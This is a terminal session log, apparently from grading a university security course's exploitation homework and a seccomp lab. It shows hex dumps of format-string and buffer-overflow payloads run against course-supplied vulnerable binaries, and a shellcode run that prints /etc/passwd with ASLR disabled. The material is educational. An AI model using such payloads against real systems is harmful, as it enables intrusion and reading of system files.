-rwxr-xr-x+ 1 ryadav3 student 8904 Oct 16 13:40 vuln_prog4.bin
-rw-r--r--+ 1 ryadav3 student  449 Oct 16 13:40 vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team10/hw2$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team10/hw2$ vim malicious_input1.py 
ryadav3@nemo:~/576/assigns/assignment2/team10/hw2$ xxd malicious_input1.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 2534 3824 6e42  AAAAAAAAAA%48$nB
00000020: ac10 6000 0000 0000 00                   ..`......
ryadav3@nemo:~/576/assigns/assignment2/team10/hw2$ ./vuln_prog1.bin 1111 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAAB?`
Stack at 0x7ffd2880c7b0

Instead
Playing Lucky You
ryadav3@nemo:~/576/assigns/assignment2/team10/hw2$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team10/hw2$ cd ../../team11/
ryadav3@nemo:~/576/assigns/assignment2/team11$ ls
hw211_late_19293_4247736_hw2.tgz
ryadav3@nemo:~/576/assigns/assignment2/team11$ tar -zxvf hw211_late_19293_4247736_hw2.tgz 

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
ryadav3@nemo:~/576/assigns/assignment2/team11$ ls
hw211_late_19293_4247736_hw2.tgz
ryadav3@nemo:~/576/assigns/assignment2/team11$ file hw211_late_19293_4247736_hw2.tgz 
hw211_late_19293_4247736_hw2.tgz: POSIX tar archive (GNU)
ryadav3@nemo:~/576/assigns/assignment2/team11$ tar -xvf hw211_late_19293_4247736_hw2.tgz 
hw2-more_attacks/
hw2-more_attacks/vuln_prog3.bin
hw2-more_attacks/vuln_prog4.bin
hw2-more_attacks/task3.txt
hw2-more_attacks/task4.txt
hw2-more_attacks/vuln_prog4.c
hw2-more_attacks/malicious_input1.txt
hw2-more_attacks/vuln_prog2.bin
hw2-more_attacks/.vuln_prog1.c.swp
hw2-more_attacks/task2.txt
hw2-more_attacks/malicious_input4.txt
hw2-more_attacks/vuln_prog3.c
hw2-more_attacks/malicious_input3.txt
hw2-more_attacks/task1.txt
hw2-more_attacks/malicious_input4.sh
hw2-more_attacks/vuln_prog1.bin
hw2-more_attacks/malicious_input5.sh
hw2-more_attacks/vuln_prog2.c
hw2-more_attacks/malicious_input1.sh
hw2-more_attacks/malicious_input2.txt
hw2-more_attacks/malicious_input5.txt
hw2-more_attacks/malicious_input2.sh
hw2-more_attacks/malicious_input3.sh
hw2-more_attacks/test.sh
hw2-more_attacks/vuln_prog1.c
ryadav3@nemo:~/576/assigns/assignment2/team11$ ls
hw211_late_19293_4247736_hw2.tgz  hw2-more_attacks
ryadav3@nemo:~/576/assigns/assignment2/team11$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ ls -l
total 12
-rw-r--r--+ 1 ryadav3 student  118 Oct 29 16:28 malicious_input1.sh
-rw-r--r--+ 1 ryadav3 student   42 Oct 29 18:20 malicious_input1.txt
-rw-r--r--+ 1 ryadav3 student  121 Oct 25 15:32 malicious_input2.sh
-rw-r--r--+ 1 ryadav3 student  101 Oct 29 18:20 malicious_input2.txt
-rw-r--r--+ 1 ryadav3 student  147 Oct 29 17:54 malicious_input3.sh
-rw-r--r--+ 1 ryadav3 student  282 Oct 29 18:20 malicious_input3.txt
-rw-r--r--+ 1 ryadav3 student   68 Oct 25 16:05 malicious_input4.sh
-rw-r--r--+ 1 ryadav3 student   20 Oct 29 18:20 malicious_input4.txt
-rw-r--r--+ 1 ryadav3 student  111 Oct 29 17:29 malicious_input5.sh
-rw-r--r--+ 1 ryadav3 student  814 Oct 29 17:29 malicious_input5.txt
-rw-r--r--+ 1 ryadav3 student  547 Oct 29 18:16 task1.txt
-rw-r--r--+ 1 ryadav3 student  609 Oct 29 18:17 task2.txt
-rw-r--r--+ 1 ryadav3 student  426 Oct 29 18:19 task3.txt
-rw-r--r--+ 1 ryadav3 student  131 Oct 29 18:20 task4.txt
-rw-r--r--+ 1 ryadav3 student   88 Oct 24 16:41 test.sh
-rwxr-xr-x+ 1 ryadav3 student 9160 Oct 12 23:32 vuln_prog1.bin
-rw-------+ 1 ryadav3 student  861 Oct 16 13:40 vuln_prog1.c
-rwxr-xr-x+ 1 ryadav3 student 9088 Oct 13 00:24 vuln_prog2.bin
-rw-------+ 1 ryadav3 student  813 Oct 16 13:40 vuln_prog2.c
-rwxr-xr-x+ 1 ryadav3 student 7492 Oct 13 01:16 vuln_prog3.bin
-rw-------+ 1 ryadav3 student  345 Oct 16 13:40 vuln_prog3.c
-rwx------+ 1 ryadav3 student 8904 Oct 16 13:40 vuln_prog4.bin
-rw-------+ 1 ryadav3 student  449 Oct 25 15:48 vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ vim test.sh 
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ vim malicious_input1.sh 
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ xxd malicious_input1.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 2533 3824 6e00  AAAAAAAAAA%38$n.
00000020: ac10 6000 0000 0000 000a                 ..`.......
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ ./vuln_prog1.bin 1111 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ ./vuln_prog1.bin 123 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ ./vuln_prog1.bin 104 < malicious_input1.txt 
Which music you want to play:

You want to play:
Segmentation fault (core dumped)
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ dmesg | tail -3
[5649999.453281] vuln_prog1.bin[31216]: segfault at 7f4c40039ff8 ip 00007f4c40075bc6 sp 00007ffedfcf8370 error 7 in libc-2.23.so[7f4c40029000+1c0000]
[5650006.451929] vuln_prog1.bin[31220]: segfault at 47f ip 00007f562807cbc6 sp 00007ffdf1b59010 error 6 in libc-2.23.so[7f5628030000+1c0000]
[5650011.620861] vuln_prog1.bin[31222]: segfault at 7ffd7dd1d2b0 ip 00007fe68d6bdbc6 sp 00007ffd7dcf5940 error 7 in libc-2.23.so[7fe68d671000+1c0000]
ryadav3@nemo:~/576/assigns/assignment2/team11/hw2-more_attacks$ cd ../..
ryadav3@nemo:~/576/assigns/assignment2$ ls
submissions-hw2.zip  team1  team10  team11  team12  team2  team3  team4  team5  team6  team7  team8  team9
ryadav3@nemo:~/576/assigns/assignment2$ cd team12/
ryadav3@nemo:~/576/assigns/assignment2/team12$ ls
ryadav3@nemo:~/576/assigns/assignment2/team12$ pwd
/home/ryadav3/576/assigns/assignment2/team12
ryadav3@nemo:~/576/assigns/assignment2/team12$ cd ../team1
ryadav3@nemo:~/576/assigns/assignment2/team1$ ls
hw21_15396_4242727_HW2.tgz  hw2-more_attacks
ryadav3@nemo:~/576/assigns/assignment2/team1$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ ls
malicious_input1.py   malicious_input2.txt  malicious_input4.py   malicious_input5.txt  task3.txt  vuln_prog1.bin  vuln_prog2.c    vuln_prog4.bin
malicious_input1.txt  malicious_input3.py   malicious_input4.txt  task1.txt             task4.txt  vuln_prog1.c    vuln_prog3.bin  vuln_prog4.c
malicious_input2.py   malicious_input3.txt  malicious_input5.py   task2.txt             task5.txt  vuln_prog2.bin  vuln_prog3.c
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ vim malicious_input2.py 
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ ./vuln_prog2.bin 10399956 < malicious_input2.txt
What would you like to bet?

You win!
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team1/hw2-more_attacks$ cd ../../team2/
ryadav3@nemo:~/576/assigns/assignment2/team2$ ls
answers  hw22_late_19610_4246043_Rachel_Stern_Min_Su_Park_HW2_CS576-3.tgz
ryadav3@nemo:~/576/assigns/assignment2/team2$ cd answers/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers$ cd task2/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task2$ ls
malicious_input2.py  malicious_input2.txt  task2.txt
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task2$ cd ../task1/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ vim task1.txt
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ cd ../task2/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task2$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task2$ cd ../task1/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task1$ cd ../task2/
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task2$ ../../../team1/hw2-more_attacks/vuln_prog2.bin 10408042 < malicious_input2.txt 
What would you like to bet?

You win!
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task2$ vim malicious_input2.py 
ryadav3@nemo:~/576/assigns/assignment2/team2/answers/task2$ cd ../../../
ryadav3@nemo:~/576/assigns/assignment2$ vim team1
team1/  team10/ team11/ team12/ 
ryadav3@nemo:~/576/assigns/assignment2$ vim team1
team1/  team10/ team11/ team12/ 
ryadav3@nemo:~/576/assigns/assignment2$ vim team1/hw2
hw21_15396_4242727_HW2.tgz  hw2-more_attacks/           
ryadav3@nemo:~/576/assigns/assignment2$ vim team1/hw2
hw21_15396_4242727_HW2.tgz  hw2-more_attacks/           
ryadav3@nemo:~/576/assigns/assignment2$ vim team1/hw2-more_attacks/malicious_input2.py 
ryadav3@nemo:~/576/assigns/assignment2$ cd team3/
ryadav3@nemo:~/576/assigns/assignment2/team3$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ ls -l
total 59
-rw-r--r--+ 1 ryadav3 student   64 Oct 22 17:24 malicious_input1.py
-rw-r--r--+ 1 ryadav3 student   41 Oct 25 16:40 malicious_input1.txt
-rw-r--r--+ 1 ryadav3 student   86 Oct 23 13:06 malicious_input2.py
-rw-r--r--+ 1 ryadav3 student  181 Oct 25 16:41 malicious_input2.txt
-rw-r--r--+ 1 ryadav3 student  492 Oct 23 19:27 malicious_input3.py
-rw-r--r--+ 1 ryadav3 student  292 Oct 25 16:41 malicious_input3.txt
-rw-r--r--+ 1 ryadav3 student   52 Oct 25 15:31 malicious_input4.py
-rw-r--r--+ 1 ryadav3 student   25 Oct 25 16:41 malicious_input4.txt
-rw-r--r--+ 1 ryadav3 student   66 Oct 25 16:15 malicious_input5.py
-rw-r--r--+ 1 ryadav3 student   28 Oct 25 16:41 malicious_input5.txt
-rw-r--r--+ 1 ryadav3 student 1446 Oct 25 16:48 task1.txt
-rw-r--r--+ 1 ryadav3 student  795 Oct 25 16:50 task2.txt
-rw-r--r--+ 1 ryadav3 student  663 Oct 25 16:50 task3.txt
-rw-r--r--+ 1 ryadav3 student  320 Oct 25 16:50 task4.txt
-rw-r--r--+ 1 ryadav3 student  682 Oct 25 16:50 task5.txt
-rwxr-xr-x+ 1 ryadav3 student 9160 Oct 12 23:32 vuln_prog1.bin
-rw-------+ 1 ryadav3 student  861 Oct 16 13:40 vuln_prog1.c
-rwxr-xr-x+ 1 ryadav3 student 9088 Oct 13 00:24 vuln_prog2.bin
-rw-------+ 1 ryadav3 student  813 Oct 16 13:40 vuln_prog2.c
-rwxr-xr-x+ 1 ryadav3 student 7492 Oct 13 01:16 vuln_prog3.bin
-rw-------+ 1 ryadav3 student  345 Oct 16 13:40 vuln_prog3.c
-rwx------+ 1 ryadav3 student 8904 Oct 16 13:40 vuln_prog4.bin
-rw-------+ 1 ryadav3 student  449 Oct 16 13:40 vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim malicious_input2.py 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ rm .malicious_input2.py.swp 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim malicious_input2.py 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ xxd malicious_input2.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000070: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000080: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000090: 9f27 0200 0000 0000 0000 0000 0000 0000  .'..............
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: de05 0000 0a                             .....
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ ./vuln_prog2.bin 10408551 < malicious_input2.txt 
What would you like to bet?

You win!
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task3.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team3/hw2-more_attacks$ cd ../../team4/
ryadav3@nemo:~/576/assigns/assignment2/team4$ ls
hw24_19609_4243898_submission.tgz  malicious_input1.sh   malicious_input2.sh   malicious_input3.sh   malicious_input4.sh   malicious_input5.sh   task1.txt  task3.txt  task5.txt
ID.txt                             malicious_input1.txt  malicious_input2.txt  malicious_input3.txt  malicious_input4.txt  malicious_input5.txt  task2.txt  task4.txt
ryadav3@nemo:~/576/assigns/assignment2/team4$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team4$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team4$ vim malicious_input2.sh 
ryadav3@nemo:~/576/assigns/assignment2/team4$ xxd malicious_input2.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000070: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000080: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000090: 9f27 0200 0000 0000 4141 4141 4141 4141  .'......AAAAAAAA
000000a0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000000b0: de05 0000                                ....
ryadav3@nemo:~/576/assigns/assignment2/team4$ ../team3/hw2-more_attacks/vuln_prog2.bin 702695 < malicious_input2.txt 
What would you like to bet?

You win!
ryadav3@nemo:~/576/assigns/assignment2/team4$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team4$ cd ../team5/
ryadav3@nemo:~/576/assigns/assignment2/team5$ ls
hw25_late_24270_4248172_hw2.tgz  hw2-more_attacks
ryadav3@nemo:~/576/assigns/assignment2/team5$ cd hw2-more_attacks/
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ls
malicious_input1-c.txt  malicious_input2.py   malicious_input3.txt  task1.txt  task4.txt       vuln_prog2.bin  vuln_prog3.c
malicious_input1.py     malicious_input2.txt  malicious_input4.py   task2.txt  vuln_prog1.bin  vuln_prog2.c    vuln_prog4.bin
malicious_input1.txt    malicious_input3.py   malicious_input4.txt  task3.txt  vuln_prog1.c    vuln_prog3.bin  vuln_prog4.c
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim task1.txt 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim task2.txt 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ vim malicious_input2.py 
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ xxd malicious_input2.txt 
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 9f27 0200 0000 0000 4141 4141 4141 4141  .'......AAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: de05 0000                                ....
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ./vuln_prog2.bin 1111 < malicious_input2.txt 
What would you like to bet?

You win!
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ ./vuln_prog1.bin 1111 < malicious_input1.txt 
Which music you want to play:

You want to play:
AAAAAAAAAAAAAAAAAAAAAAAAAA
Stack at 0x7ffd043f1850

Instead
Playing Perfect
ryadav3@nemo:~/576/assigns/assignment2/team5/hw2-more_attacks$ kill -9 $$
Connection to nemo.srcit.stevens-tech.edu closed.
Lunarantic:576 Lunarantic$ ssh ryadav3@nemo.srcit.stevens-tech.edu
ryadav3@nemo.srcit.stevens-tech.edu's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

42 packages can be updated.
0 updates are security updates.

New release '18.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


*** System restart required ***
Last login: Wed Oct 31 18:36:17 2018 from 155.246.170.77
ryadav3@nemo:~$ cd 576/labs/lab9/
ryadav3@nemo:~/576/labs/lab9$ cd vul/
ryadav3@nemo:~/576/labs/lab9/vul$ ls
Makefile  payload  payload.py  sec_prog10.c  sec_prog1.c  vuln_prog  vuln_prog1.c
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc /lib/x86_64-linux-gnu/libseccomp.so.2 -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c: In function ‘main’:
sec_prog1.c:46:2: error: unknown type name ‘scmp_filter_ctx’
  scmp_filter_ctx * ctx;
  ^
sec_prog1.c:47:8: warning: implicit declaration of function ‘seccomp_init’ [-Wimplicit-function-declaration]
  ctx = seccomp_init(SCMP_ACT_KILL);
        ^
sec_prog1.c:47:21: error: ‘SCMP_ACT_KILL’ undeclared (first use in this function)
  ctx = seccomp_init(SCMP_ACT_KILL);
                     ^
sec_prog1.c:47:21: note: each undeclared identifier is reported only once for each function it appears in
sec_prog1.c:49:2: warning: implicit declaration of function ‘seccomp_rule_add’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ^
sec_prog1.c:49:24: error: ‘SCMP_ACT_ALLOW’ undeclared (first use in this function)
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                        ^
sec_prog1.c:49:40: warning: implicit declaration of function ‘SCMP_SYS’ [-Wimplicit-function-declaration]
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
                                        ^
sec_prog1.c:53:2: warning: implicit declaration of function ‘seccomp_load’ [-Wimplicit-function-declaration]
  seccomp_load(ctx);
  ^
Makefile:11: recipe for target 'sec_prog' failed
make: *** [sec_prog] Error 1
ryadav3@nemo:~/576/labs/lab9/vul$ vim Makefile 
ryadav3@nemo:~/576/labs/lab9/vul$ vim vuln_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc -libseccomp -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
sec_prog1.c:6:20: fatal error: filter.h: No such file or directory
compilation terminated.
Makefile:11: recipe for target 'sec_prog' failed
make: *** [sec_prog] Error 1
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc -libseccomp -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
/usr/bin/ld: cannot find -libseccomp
collect2: error: ld returned 1 exit status
Makefile:11: recipe for target 'sec_prog' failed
make: *** [sec_prog] Error 1
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c 
ryadav3@nemo:~/576/labs/lab9/vul$ vim Makefile 
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc -lseccomp -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c
/tmp/cc63FmEt.o: In function `main':
sec_prog1.c:(.text+0xfa): undefined reference to `seccomp_init'
sec_prog1.c:(.text+0x120): undefined reference to `seccomp_rule_add'
sec_prog1.c:(.text+0x141): undefined reference to `seccomp_rule_add'
sec_prog1.c:(.text+0x162): undefined reference to `seccomp_rule_add'
sec_prog1.c:(.text+0x16f): undefined reference to `seccomp_load'
collect2: error: ld returned 1 exit status
Makefile:11: recipe for target 'sec_prog' failed
make: *** [sec_prog] Error 1
ryadav3@nemo:~/576/labs/lab9/vul$ gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c -lseccomp
ryadav3@nemo:~/576/labs/lab9/vul$ vim Makefile 
ryadav3@nemo:~/576/labs/lab9/vul$ make
make: Nothing to be done for 'all'.
ryadav3@nemo:~/576/labs/lab9/vul$ ls
Makefile  payload  payload.py  sec_prog  sec_prog10.c  sec_prog1.c  vuln_prog  vuln_prog1.c
ryadav3@nemo:~/576/labs/lab9/vul$ ./vuln_prog 
Enter verification string?
aa
^C
ryadav3@nemo:~/576/labs/lab9/vul$ ./vuln_prog < payload
Enter verification string?
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????
Segmentation fault (core dumped)
ryadav3@nemo:~/576/labs/lab9/vul$ setarch x86_64 -R ./vuln_prog < payload
Enter verification string?
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
cslocal:x:1000:1000:cslocal,,,:/home/cslocal:/bin/bash
ntp:x:111:117::/home/ntp:/bin/false
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
statd:x:113:65534::/var/lib/nfs:/bin/false
smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
ryadav3@nemo:~/576/labs/lab9/vul$ xxd payload | less
ryadav3@nemo:~/576/labs/lab9/vul$ 
ryadav3@nemo:~/576/labs/lab9/vul$ setarch x86_64 -R ./sec_prog < payload
Bad system call
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog.c
ryadav3@nemo:~/576/labs/lab9/vul$ vim sec_prog1.c
ryadav3@nemo:~/576/labs/lab9/vul$ make
gcc -fno-stack-protector -z execstack -fomit-frame-pointer -O0 -o sec_prog sec_prog1.c -lseccomp
ryadav3@nemo:~/576/labs/lab9/vul$ gdb ./vuln_prog 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln_prog...(no debugging symbols found)...done.
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/vuln_prog < payload
Enter verification string?
Verifying: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
